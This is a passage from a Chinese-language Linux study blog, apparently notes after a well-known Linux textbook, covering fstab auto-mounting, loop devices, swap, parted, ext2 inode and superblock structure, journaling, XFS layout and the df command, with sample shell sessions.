/dev/sda3</span><br><span class="line">brw-rw----. 1 root disk 8, 4 1月  10 03:22 /dev/sda4</span><br><span class="line">brw-rw----. 1 root disk 8, 5 1月  10 03:22 /dev/sda5</span><br></pre></td></tr></table></figure><p>一般都是自动产生的，在某些情况下就需要手动处理，这时就需要mknod</p><ul><li><p><code>mknod dev [bcp] [Major] [Minor]</code></p></li><li><p><code>b</code>一个外接存储设备，磁盘等</p></li><li><p><code>c</code>外接输入设备，如键盘鼠标etc</p></li><li><p><code>p</code>设备名称是一个FIFO（先进先出）文件</p></li></ul><h3 id="xfs-admin"><a href="#xfs-admin" class="headerlink" title="xfs_admin"></a>xfs_admin</h3><ul><li>可以修改XFS的UUID和LABLEname</li><li><code>xfs_admin [-L label] [-u uuoid] dev</code></li><li><code>-l</code> Print the current filesystem label.</li><li><code>-L</code>Set the filesystem label.</li><li><code>-u</code>Print the current filesystem UUID.</li><li><code>-U</code>set the filesystem UUID.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># xfs_admrein -l /dev/sda4</span></span><br><span class="line">label = <span class="string">&quot;&quot;</span></span><br><span class="line">[root@study ~]<span class="comment"># xfs_admin -L yang.xfs /dev/sda4</span></span><br><span class="line">writing all SBs</span><br><span class="line">new label = <span class="string">&quot;yang.xfs&quot;</span></span><br></pre></td></tr></table></figure><p>设置UUID前，先用<code>uuidgen</code>产生新的、独一无二的UUID，卸载文件系统再设置</p><h3 id="tune2fs"><a href="#tune2fs" class="headerlink" title="tune2fs"></a>tune2fs</h3><ul><li><code>tune2fs [-l][-L label][-U uuid]</code></li><li><code>-l</code>显示超级区块的信息</li></ul><h2 id="自动挂载"><a href="#自动挂载" class="headerlink" title="自动挂载"></a>自动挂载</h2><p>前面手动挂载后重启，系统会查找/etc/fstab的信息挂载，自然我们也要重新手动挂载，能不能让系统自动挂载呢，这时候就要去修改fstab。有几个前提</p><ol><li><code>/</code>必须挂载，且要最先挂载</li><li>其他挂载点必须要是已建立目录，为了易读，最好按照<a href="https://www.cnblogs.com/happyframework/p/4480228.html">FHS</a>标准</li><li>所有挂载点同一时间内只能挂载一次</li><li>所有硬盘分区同一时间内只能挂载一次</li><li>卸载时要离开卸载的目录</li></ol><p>查看fstab（filesystem table）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/fstab</span></span><br><span class="line"><span class="comment"># Created by anaconda on Sat Dec 28 07:29:36 2019</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;</span></span><br><span class="line"><span class="comment"># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#devices                       Mount point          filesystem   options       dump fsck</span></span><br><span class="line">/dev/mapper/centos-root         /                   xfs          defaults        0    0</span><br><span class="line">UUID=1bedab37-0c01-459c-a8f7-cfd4c5f203f9 /boot     xfs          defaults        0    0</span><br><span class="line">/dev/mapper/centos-home         /home               xfs          defaults        0    0</span><br><span class="line">/dev/mapper/centos-swap         swap                swap         defaults        0    0</span><br></pre></td></tr></table></figure><p>原文件排版不是很好，我改了一下，顺便加上了每行的注释</p><ul><li>第一列可以是UUID、LABEL、/dev/，代表那个设备</li><li>第二列是挂载点</li><li>第三列是文件系统</li><li>第四列是文件系统参数</li></ul><table><thead><tr><th>options</th><th>表示意义</th></tr></thead><tbody><tr><td>async(异步)/sync(同步)</td><td>设置磁盘是否以异步执行，默认async</td></tr><tr><td>auto/noauto</td><td>执行mount -a时，是否会被主动测试挂载，默认auto</td></tr><tr><td>rw(读写)/ro(只读)</td><td>挂载的状态，若设置ro，就算有w也不能写</td></tr><tr><td>exec/noexec</td><td>是否可执行这个文件系统</td></tr><tr><td>user/nouser</td><td>是否允许用户使用mount挂载，默认nouser</td></tr><tr><td>suid/nosuid</td><td>是否有SUID，有执行文件时还是设置suid比较好</td></tr><tr><td>defaults</td><td>表示rw,suid,dev(解析文件上的特殊设备),exec,auto,nouser,async</td></tr></tbody></table><p>更多options参见mount(8)和<a href="https://wiki.archlinux.org/index.php/Fstab_(简体中文))">https://wiki.archlinux.org/index.php/Fstab_(简体中文))</a></p><ul><li>第五列是dump备份</li><li>第六列是fsck检验扇区</li></ul><p>比如我要挂载我的sda4，就在fstab下添加一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LABEL=yang.xfs                  /data/xfs           xfs          defaults        0    0</span><br></pre></td></tr></table></figure><blockquote><p>修改fstab后最好mount -a测试一下，如果重启错误会进入单人维护模式，根目录只读.</p><p>需要指令<code>mount -n -o remount,rw /</code></p></blockquote><h2 id="loop设备挂载"><a href="#loop设备挂载" class="headerlink" title="loop设备挂载"></a>loop设备挂载</h2><p>有光盘镜像文件时，可以直接挂载，不用刻录</p><h3 id="挂载CD-DVD镜像文件"><a href="#挂载CD-DVD镜像文件" class="headerlink" title="挂载CD/DVD镜像文件"></a>挂载CD/DVD镜像文件</h3><p>直接输入指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop file mouontpoint</span><br></pre></td></tr></table></figure><blockquote><p>这里我碰到了一个小问题，我的CentOS-everthing有10.3G，挂载后使用ll -h看了下，整个镜像文件就像缩水一样，最小14，最大几十M，但是在桌面环境查看却没啥异样，是ll -h的单位不一样吗？</p><p>来自几个月后的我解决了这个问题, ll -h显示的单位是bloock</p></blockquote><h3 id="制作loop设备并挂载"><a href="#制作loop设备并挂载" class="headerlink" title="制作loop设备并挂载"></a>制作loop设备并挂载</h3><p>既然镜像文件能够被挂载，于是有一个想法，就是建立一个大文件，把这个文件创建文件系统，然后挂载。感觉吧就像分区里的分区，如果某个分区太大，我可以在分出一部分，将它挂载，等于多了一个分区</p><h4 id="1-建立大型文件"><a href="#1-建立大型文件" class="headerlink" title="1.建立大型文件"></a>1.建立大型文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]<span class="comment"># dd if=/dev/zero of=/srv/dvd bs=1M count=512</span></span><br><span class="line">记录了512+0 的读入</span><br><span class="line">记录了512+0 的写出</span><br><span class="line">536870912字节(537 MB)已复制，3.77046 秒，142 MB/秒</span><br><span class="line">[root@study ~]<span class="comment"># ll -h /srv/dvd</span></span><br><span class="line">-rw-r--r--. 1 root root 512M 1月  10 19:57 /srv/dvd</span><br></pre></td></tr></table></figure><p><strong>dd</strong></p><ul><li><code>if</code>input file，/dev/zero是一个一值输出0的设备</li><li><code>of</code>ouput file</li><li><code>bs</code>block size</li><li><code>count</code>bs*count</li></ul><h4 id="2-创建文件系统、挂载"><a href="#2-创建文件系统、挂载" class="headerlink" title="2.创建文件系统、挂载"></a>2.创建文件系统、挂载</h4><p>默认的xfs不能格式化文件，需要加上-f选项</p><ol><li><code>mkfs.xfs -f file</code></li><li>查看<code>UUID</code></li><li>挂载<code>mount -o loop UUID=&quot;&quot; dir</code></li><li>想要永久挂载就更新<code>fstab</code></li></ol><p>注意设备名不建议写UUID，UUID通常是设备上的，最好使用文件名，不容易出现错误</p><h2 id="内存交换分区swap"><a href="#内存交换分区swap" class="headerlink" title="内存交换分区swap"></a>内存交换分区swap</h2><p>当内存不足时会将以一些数据暂存swap，在现在的来说很少用到，毕竟现在内存这么大， 动不动就是64G的，一般是用到服务器上以备不时之需的。</p><p>一般建立系统时可以创建swap</p><p>进入系统的创建方法</p><p><strong>1.划出一个物理分区创建为swap</strong></p><ul><li>使用gdisk分区，分区默认code是8300，改成8200就代表swap</li><li>格式化分区使用<code>mkswap /dev</code></li><li>挂载，不过不是用mount，而是<code>swapon /dev</code></li><li><code>free</code>和<code>swapon -s</code>可以查看内存使用量</li></ul><p><strong>2.大型文件转为swap</strong></p><p>类似于loop设备文件，使用dd创建一个大文件，将其格式化，挂载就可以了</p><p>格式化指令<code>mkswap dir</code></p><p>挂载指令<code>swapon dir</code></p><p>关闭swap指令<code>swapoff dir/dev</code></p><p>此外要自动挂载的话，更新fstab要注意文件的UUID系统搜不到，swap的挂载点要设为<code>swap</code></p><h2 id="分区通用指令parted"><a href="#分区通用指令parted" class="headerlink" title="分区通用指令parted"></a>分区通用指令parted</h2><ul><li><code>parted [dev] [command [options]]</code></li></ul><p><code>command</code></p><ol><li>创建分区：<code>mkpart [primary|logical|Extended] [ext4|vfat|xfs]</code></li><li>显示指令：<code>print</code></li><li>删除分区：<code>rm [partition]</code></li></ol><hr><blockquote><p>参考《鸟哥的Linux私房菜 基础学习篇》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件系统 </tag>
            
            <tag> 挂载 </tag>
            
            <tag> swap </tag>
            
            <tag> 分区 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（五）Linux文件系统管理</title>
      <link href="/Linux/5.%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F.html"/>
      <url>/Linux/5.%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F.html</url>
      
        <content type="html"><![CDATA[<p> 深入理解3</p><span id="more"></span><h2 id="文件系统特性"><a href="#文件系统特性" class="headerlink" title="文件系统特性"></a>文件系统特性</h2><ul><li>每个操作系统设置的文件属性、权限都不同，将分区格式化才能成为系统能够利用的文件格式（filesystem）</li><li>传统一个分区只能格式化成一个文件系统，新技术能将一个分区格式化成多个文件系统（LVM）<ul><li>格式化不再针对硬盘分区</li><li><strong>一个被挂载的数据为一个文件系统而不是一个分区</strong></li></ul></li><li>Linux有文件权限、属性，文件系统会将两部分数据存放在不同的区块，权限属性放在inode，实际数据放在数据块中，还有一个超级区块（superblock）记录文件系统的整体信息，比如数据快总量、剩余、使用</li><li>每个inode和区块都有编号，它们的作用如下<ul><li>超级区块：记录文件系统的整体信息，包括inode和超级区块的总量、使用、剩余，以及文件系统的格式和信息等</li><li>inode：记录文件属性，一个属性占用一个inode，同时记录文件数据所在的区块号码</li><li>数据区块：实际记录文件的内容，文件过大占用多个区块</li></ul></li></ul><blockquote><p>硬盘的读取顺序是inode记录的号码，比如记录的是1、3、5、6号码，则硬盘会一次性读取这四个块的内容，这叫<strong>索引式文件系统</strong></p><p>u盘的FAT格式则是<code>1-&gt;3-&gt;5-&gt;6</code>这样的读取顺序</p><ul><li>碎片整理：当存取的文件过于离散（读取性能差）时使用碎片整理可以将文件的区块集中起来</li></ul></blockquote><h2 id="Linux的ext2文件系统"><a href="#Linux的ext2文件系统" class="headerlink" title="Linux的ext2文件系统"></a>Linux的ext2文件系统</h2><p>ext2(Linux second extended filesystem,ext2fs)</p><p>ext2采用了inode，文件系统一开始就将inode和数据块规划好了了，除非重新格式化或者使用resize2fs命令修改大小，但将inode和数据块放在一起不好管理，所以一般都是区分为多个区块群组</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2019/ext2.png" alt="ext2" style="zoom:50%;" /><p>文件系统最前面有一个boot sector，可以用来装<strong>引导程序</strong>（多重引导）</p><p>每个群组有六个主要内容</p><h3 id="数据区块"><a href="#数据区块" class="headerlink" title="数据区块"></a>数据区块</h3><p>在ext2文件系统中支持的区块大小有1k、2k和4k，大小在格式化时确定，每个区块大小所支持的单一文件大小和文件系统的最大支持磁盘容量都不相同</p><table><thead><tr><th>Block大小</th><th>1KB</th><th>2KB</th><th>4KB</th></tr></thead><tbody><tr><td>单一文件限制</td><td>16GB</td><td>256GB</td><td>2TB</td></tr><tr><td>最大文件系统总容量</td><td>2TB</td><td>8TB</td><td>16TB</td></tr></tbody></table><blockquote><p>就算文件系统支持2TB，软件也要支持才行</p></blockquote><p><strong>ext2文件系统的区块限制</strong></p><ol><li>原则上，区块的大小与数量在格式化完就不能再修改（重新格式化）</li><li>每个区块内最多只能放一个文件的数据</li><li>如果文件大于一个区块，则一个文件会占用多个区块</li><li>若文件小于一个区块，则剩余容量被浪费</li></ol><blockquote><p>比如文件系统使用4k大小，而每个文件只有1k，则存储一个文件会浪费3k</p><p>当文件过大时，使用区块容量最大的则文件系统的区块号码就少，方便读写</p></blockquote><h3 id="inode-table"><a href="#inode-table" class="headerlink" title="inode table"></a>inode table</h3><ul><li>记录了读写属性</li><li>拥有者和群组</li><li>大小</li><li>文件的atimr、ctime、mtime</li><li>特性标识flag，如SetUID</li><li>该文件的真正内容指向（pointer）</li><li>每个inode的大小为128B（ext4、xfs可以到256B）</li><li>每个文件仅占用一个inode</li><li>所以系统能建立的文件数量与inode数量有关</li><li>系统读取文件时会先找到inode，分析inode记录的权限与用户的权限是否符合，然后才能读取</li></ul><p>为了记录更多的信息，inode记录的区块号码的区域定义是12个直接、1个间接、1个双间接、1个三间接</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/inode.jpg" alt="inode"></p><p>图源<a href="https://zhuanlan.zhihu.com/p/40604943">https://zhuanlan.zhihu.com/p/40604943</a></p><p><strong>文件太大是，才会用到间接，间接就是再拿一个区块来记录区块号码的记录区</strong></p><blockquote><p>以1k区块为例</p><ul><li>12个直接：12X1K=12K</li></ul><p>每个区块1K，记录一个区块使用4B，一个区块能记录256个区块</p><ul><li>间接：256X1K=256K</li><li>双间接：256X256X1K=256^2K</li><li>三间接：256^3K</li></ul><p>以上加起来16GB</p><p>由于大于2K的区块会受到ext2文件系统的限制，上面的计算不适用2K、4K</p></blockquote><h3 id="Superblock"><a href="#Superblock" class="headerlink" title="Superblock"></a>Superblock</h3><ul><li>记录数据区块与inode的总量</li><li>未使用的、已使用的inode与数据块数量</li><li>数据块的大小（1、2、4k），inode的大小（128、256B）</li><li>文件系统的挂载信息，最近一次写入数据的时间、最近一次检验磁盘（fsck）的时间等文件系统相关信息</li><li>一个有效位数值，若此文件已被挂载，则有效位为0，否则为1</li></ul><p>虽然每个群组都可能含有超级区块，但实际上文件系统应仅有一个超级区块，除了第一个区块有超级区块外，后面不一定有超级区块，有的话主要也是作为备份</p><h3 id="Filesystem-Description"><a href="#Filesystem-Description" class="headerlink" title="Filesystem Description"></a>Filesystem Description</h3><p>可以描述每个区块群组的开始和结束区块，以及说明每个区段（suoerblock、对照表、inode对照表、数据区块）分别位于哪一个区块之间，可以使用dumpe2fs观察</p><h3 id="区块对照表（block-bitmap）"><a href="#区块对照表（block-bitmap）" class="headerlink" title="区块对照表（block bitmap）"></a>区块对照表（block bitmap）</h3><p>说明哪些区块是是空的，哪些使用过的</p><h3 id="inode对照表"><a href="#inode对照表" class="headerlink" title="inode对照表"></a>inode对照表</h3><p>负责记录使用与未使用的inode号码</p><h3 id="dumpe2fs"><a href="#dumpe2fs" class="headerlink" title="dumpe2fs"></a>dumpe2fs</h3><p>可以用查询ext系列超级区块的信息</p><h2 id="结合目录树"><a href="#结合目录树" class="headerlink" title="结合目录树"></a>结合目录树</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>目录主要记录文件名，文件才是真正记录文件的地方</p><ul><li><p>创建目录时，文件系统会分配一个<strong>inode</strong>和至少一个<strong>区块</strong>给目录</p><ul><li><strong>inode</strong>记录权限和属性</li><li>区块记录<strong>文件名</strong>和<strong>文件名的inode</strong>信息</li></ul></li><li><p>目录的文件名过多时，会使用多个区块</p></li></ul><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><ul><li>建立文件时，会分配<strong>一个inode</strong>和<strong>相对于文件大小的区块数量</strong>，注意直接不够用时用间接会使用额外的区块</li></ul><h3 id="读取目录树"><a href="#读取目录树" class="headerlink" title="读取目录树"></a>读取目录树</h3><p>目录树从根目录开始，系统通过挂载点的信息找到挂载点的inode，层层递进找到正确的目录</p><p>例如<code>/etc/passwd</code></p><ol><li>通过挂载点找到<code>/</code>的<strong>inode</strong>，判断权限<strong>rx</strong>才能进入</li><li>承上找到<code>/</code>的<strong>区块</strong>，在区块里找到<strong>etc/的inode</strong>号码，同样判断<strong>rx</strong>权限</li><li>承上找到<code>etc/</code>的<strong>区块</strong>，找到<strong>passwd</strong>文件的<strong>inode</strong>号码，判断<strong>r</strong></li><li>读取passwd的区块内的内容</li></ol><h3 id="文件大小和读取性能"><a href="#文件大小和读取性能" class="headerlink" title="文件大小和读取性能"></a>文件大小和读取性能</h3><p>文件通常是无法写在一起的，一般是填充在空的区块中，就会发生<strong>文件数据离散</strong></p><ul><li>当文件太过离散时，就会发生读取效率降低</li><li>可以把文件系统的数据复制出来，格式化文件系统在复制回去解决</li><li>但是文件系统太大时，文件太容易分散，磁盘的物理结构查找比较费时，要合理规划文件系统大小</li></ul><h2 id="ext文件的存取和日志式文件系统的功能"><a href="#ext文件的存取和日志式文件系统的功能" class="headerlink" title="ext文件的存取和日志式文件系统的功能"></a>ext文件的存取和日志式文件系统的功能</h2><p>创建文件时文件系统的操作是</p><ul><li>判断用户在此目录是否具有wx权限</li><li>在inode对照表找到空的inode号码，写入权限属性</li><li>根据区块对照表找到空的区块号码，写入数据，并更新inode所指向的区块数据</li><li>更新inode对照表与区块对照表，然后更新超级区块</li></ul><p>一般将inode对照表、数据区块叫数据存放区，超级区块、区块对照表、inode对照表较元数据（metadata），因为数据变动时都可能会影响这些数据</p><h3 id="数据的不一致（inconsistent）"><a href="#数据的不一致（inconsistent）" class="headerlink" title="数据的不一致（inconsistent）"></a>数据的不一致（inconsistent）</h3><p>正确的文件写入步骤如上，但总会碰到一些特殊情况，比如断电、死机、系统错误等，可能会导致元数据没有更新，然后元数据和实际数据就会不一致</p><p>在ext2为了解决这个问题，借由超级区块当中记录的有效位（是否挂载）和文件系统的状态（是否正确卸载）来判断是否强制检查数据的一致性，或者手动使用<strong>e2fsck</strong>程序检查，但是这种检查都会检查整个文件系统，相当费时，于是有了后来的日志式文件系统</p><h3 id="日志式文件系统（journaling-filesystem）"><a href="#日志式文件系统（journaling-filesystem）" class="headerlink" title="日志式文件系统（journaling filesystem）"></a>日志式文件系统（journaling filesystem）</h3><p>所谓日志就是使用一个区块专门记录文件的写入和修改文件的操作</p><ul><li>当系统写入文件时，会在日志记录区记录写入的信息</li><li>然后开始正常写入，更新<code>metadata</code></li><li>结束后才会完成此次记录</li></ul><p>出问题时就会专门检查这个记录区块，这样就达到了快速修复文件系统，是日志文件系统最基础的功能</p><h3 id="Linux文件系统的运行"><a href="#Linux文件系统的运行" class="headerlink" title="Linux文件系统的运行"></a>Linux文件系统的运行</h3><p>若编辑一个大型文件，从磁盘读取到内存，再给CPU，编辑中如果再写入磁盘，由于磁盘速度比CPU慢很多，编辑中会频繁的等待，没有效率，于是Linux采用了<strong>异步处理</strong>（<code>asynchronously</code>）的方式，大致过程如下</p><ol><li>内存加载文件，若没被修改，则被系统设置为<strong>干净</strong>（<code>clean</code>）</li><li>修改过则是<code>dirty</code></li><li>系统会不定时的将dirty写进磁盘，或者手动使用<code>sync</code></li></ol><p>也就是将文件放在内存中以提高系统性能，所以Linux文件系统与内存关系很大</p><ul><li>系统会将常用的文件加载到内存缓存区</li><li>所以Linux的物理内存都会用光，可以提高系统性能</li><li>可以手动使用sync将数据写入磁盘</li><li>正常关机也会调用sync指令</li><li>若不正常关机，因为数据没写进磁盘，重新启动会花更多时间进行磁盘校验，甚至会导致文件系统损坏</li></ul><h3 id="挂载点的意义-mount-point"><a href="#挂载点的意义-mount-point" class="headerlink" title="挂载点的意义(mount point)"></a>挂载点的意义(mount point)</h3><p>每个文件系统都有inode、区块，要与目录树链接才能使用，这就是<strong>挂载</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ ls -lid / /boot /home</span><br><span class="line">64 dr-xr-xr-x. 17 root root  245 1月   2 22:29 /</span><br><span class="line">64 dr-xr-xr-x.  5 root root 4096 12月 28 07:44 /boot</span><br><span class="line">64 drwxr-xr-x.  3 root root   20 12月 28 07:43 /home</span><br></pre></td></tr></table></figure><ul><li>装Linux时我安装了<code>/ 、/boot 、/home</code>三个目录，于是有3个挂载点</li><li>每个的inode相同，代表三个不同的文件系统</li></ul><h2 id="Linux支持的文件系统"><a href="#Linux支持的文件系统" class="headerlink" title="Linux支持的文件系统"></a>Linux支持的文件系统</h2><ul><li>传统文件系统：ext2、minix、FAT、iso9660等</li><li>日志式文件系统：ext3、ext4、ReiserFS、Windows’NTFS、IBM’s JFS、SGI’s XFS、ZFS</li><li>网络文件系统：NFS、SMBFS</li></ul><p>查看某Linux支持的文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ ls -l /lib/modules/$(uname -r)/kernel/fs</span><br><span class="line">总用量 20</span><br><span class="line">-rw-r--r--. 1 root root 5980 8月   8 02:21 binfmt_misc.ko.xz</span><br><span class="line">drwxr-xr-x. 2 root root   25 12月 28 07:32 btrfs</span><br><span class="line">drwxr-xr-x. 2 root root   30 12月 28 07:32 cachefiles</span><br><span class="line">drwxr-xr-x. 2 root root   24 12月 28 07:32 ceph</span><br><span class="line">drwxr-xr-x. 2 root root   24 12月 28 07:32 cifs</span><br><span class="line">drwxr-xr-x. 2 root root   26 12月 28 07:32 cramfs</span><br><span class="line">drwxr-xr-x. 2 root root   23 12月 28 07:32 dlm</span><br><span class="line">drwxr-xr-x. 2 root root   26 12月 28 07:32 exofs</span><br><span class="line">drwxr-xr-x. 2 root root   24 12月 28 07:32 ext4</span><br><span class="line">drwxr-xr-x. 2 root root   60 12月 28 07:32 fat</span><br><span class="line">drwxr-xr-x. 2 root root   27 12月 28 07:32 fscache</span><br><span class="line">drwxr-xr-x. 2 root root   42 12月 28 07:32 fuse</span><br><span class="line">drwxr-xr-x. 2 root root   24 12月 28 07:32 gfs2</span><br><span class="line">drwxr-xr-x. 2 root root   25 12月 28 07:32 isofs</span><br><span class="line">drwxr-xr-x. 2 root root   24 12月 28 07:32 jbd2</span><br><span class="line">drwxr-xr-x. 2 root root   25 12月 28 07:32 lockd</span><br><span class="line">-rw-r--r--. 1 root root 5216 8月   8 02:21 mbcache.ko.xz</span><br><span class="line">drwxr-xr-x. 6 root root  137 12月 28 07:32 nfs</span><br><span class="line">drwxr-xr-x. 2 root root   46 12月 28 07:32 nfs_common</span><br><span class="line">drwxr-xr-x. 2 root root   24 12月 28 07:32 nfsd</span><br><span class="line">drwxr-xr-x. 2 root root 4096 12月 28 07:32 nls</span><br><span class="line">drwxr-xr-x. 2 root root   27 12月 28 07:32 overlayfs</span><br><span class="line">drwxr-xr-x. 2 root root   27 12月 28 07:32 pstore</span><br><span class="line">drwxr-xr-x. 2 root root   28 12月 28 07:32 squashfs</span><br><span class="line">drwxr-xr-x. 2 root root   23 12月 28 07:32 udf</span><br><span class="line">drwxr-xr-x. 2 root root   23 12月 28 07:32 xfs</span><br></pre></td></tr></table></figure><h2 id="VFS-Virtual-Filesystem-Switch"><a href="#VFS-Virtual-Filesystem-Switch" class="headerlink" title="VFS(Virtual Filesystem Switch)"></a>VFS(Virtual Filesystem Switch)</h2><p>Linux通过<strong>VFS</strong>识别不同的文件系统，Linux识别的文件系统都是<strong>VFS</strong>管理</p><p><a href="https://www.ibm.com/developerworks/cn/linux/l-virtual-filesystem-switch/"><u>更多VFS的信息</u></a></p><h2 id="XFS"><a href="#XFS" class="headerlink" title="XFS"></a>XFS</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>随着磁盘的容量越来越大，现在的单位已经是PB、EB，ext采用的是先规划出inode、区块、元数据，在大容量的磁盘面前需要很多时间，特别是一些巨型文件，在ext的效率也不是很好，然后有了xfs文件系统，是一个日志式文件系统，具备了几乎所有ext4文件系统的功能</p><h3 id="XFS文件系统的配置"><a href="#XFS文件系统的配置" class="headerlink" title="XFS文件系统的配置"></a>XFS文件系统的配置</h3><h4 id="1-数据区（data-section）"><a href="#1-数据区（data-section）" class="headerlink" title="1.数据区（data section）"></a>1.数据区（data section）</h4><p>类似于ext的<code>block groups</code>，分为多个存储区群组<code>allocation groups</code>，每个群组包括了</p><ul><li>整个文件系统的超级区块</li><li>inode的分配与追踪，inode与数据区块都是动态产生（所有格式化很快），不同意ext的事先规划</li><li>剩余空间的管理机制</li></ul><p>此外，xfs的区块容量可以设置为512B<del>64K（Linux最大4K），inode可设置256B</del>2MB，</p><h4 id="2-文件系统活动登陆区（log-section）"><a href="#2-文件系统活动登陆区（log-section）" class="headerlink" title="2.文件系统活动登陆区（log section）"></a>2.文件系统活动登陆区（log section）</h4><p>记录文件系统的变化，就像日志区</p><p>因为所有操作都要在这个区作记录，所有这个区的读写很频繁</p><p>xfs在设计上允许使用外部磁盘作为登陆区（比如使用SSD加快速度）</p><h4 id="实时运行区（realtime-section）"><a href="#实时运行区（realtime-section）" class="headerlink" title="实时运行区（realtime section）"></a>实时运行区（realtime section）</h4><p>建立文件时，xfs会在这个区里找数个extent区块放置文件，然后写入data section的inode和区块中，extent的大小在格式化时指定，范围4K~1G</p><p>xfs的详细信息可以参考<a href="https://xfs.org/docs/xfsdocs-xml-dev/XFS_Filesystem_Structrue//tmp/en-US/html/index.html">xfs官网</a>和<a href="https://blog.csdn.net/scaleqiao/article/details/520985">https://blog.csdn.net/scaleqiao/article/details/520985</a></p><h3 id="xfs描述数据观察"><a href="#xfs描述数据观察" class="headerlink" title="xfs描述数据观察"></a>xfs描述数据观察</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ df -T /boot</span><br><span class="line">文件系统       类型   1K-块   已用   可用 已用% 挂载点</span><br><span class="line">/dev/sda2      xfs  1038336 174128 864208   17% /boot</span><br><span class="line">[manu@study ~]$ xfs_info /dev/sda2</span><br><span class="line">meta-data=/dev/sda2              isize=512    agcount=4, agsize=65536 blks</span><br><span class="line">         =                       sectsz=512   attr=2, projid32bit=1</span><br><span class="line">         =                       crc=1        finobt=0 spinodes=0</span><br><span class="line">data     =                       bsize=4096   blocks=262144, imaxpct=25</span><br><span class="line">         =                       sunit=0      swidth=0 blks</span><br><span class="line">naming   =version 2              bsize=4096   ascii-ci=0 ftype=1</span><br><span class="line"><span class="built_in">log</span>      =internal               bsize=4096   blocks=2560, version=2</span><br><span class="line">         =                       sectsz=512   sunit=0 blks, lazy-count=1</span><br><span class="line">realtime =none                   extsz=4096   blocks=0, rtextents=0</span><br></pre></td></tr></table></figure><ul><li><strong>isize</strong>指的是inode的容量256B，<strong>agcount</strong>代表allocation group的数量4个，<strong>agsize</strong>代表每个allocation group有多少区块，区块大小在第4行<code>bsize=4k</code>，所以整个文件系统大小=<code>4X65536X4K</code></li><li>sectsz代表逻辑扇区的容量设置为<code>512B</code></li><li>log=internal代表log section在文件系统内部，大小=<code>4096BX2560</code></li></ul><h2 id="简单操作"><a href="#简单操作" class="headerlink" title="简单操作"></a>简单操作</h2><h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><ul><li>列出文件系统的整体磁盘使用量</li><li><code>df [-] dir/file</code></li><li><code>-a</code>列出所有文件系统</li><li><code>-k</code>以KB显示文件系统</li><li><code>-m</code>以MB显示文件系统</li><li><code>-h</code>以GB、MB、KB自动显示，方便阅读</li><li><code>-H</code>M=1024K</li><li><code>-T</code>显示硬盘分区的文件系统</li><li><code>-i</code>使用inode的形式显示</li><li>没选项时默认将系统的所有文件系统全列出来</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[manu@study ~]$ df</span><br><span class="line">文件系统                   1K-块     已用    可用 已用% 挂载点</span><br><span class="line">devtmpfs                  480848        0  480848    0% /dev</span><br><span class="line">tmpfs                     497872        0  497872    0% /dev/shm</span><br><span class="line">tmpfs                     497872     8768  489104    2% /run</span><br><span class="line">tmpfs                     497872        0  497872    0% 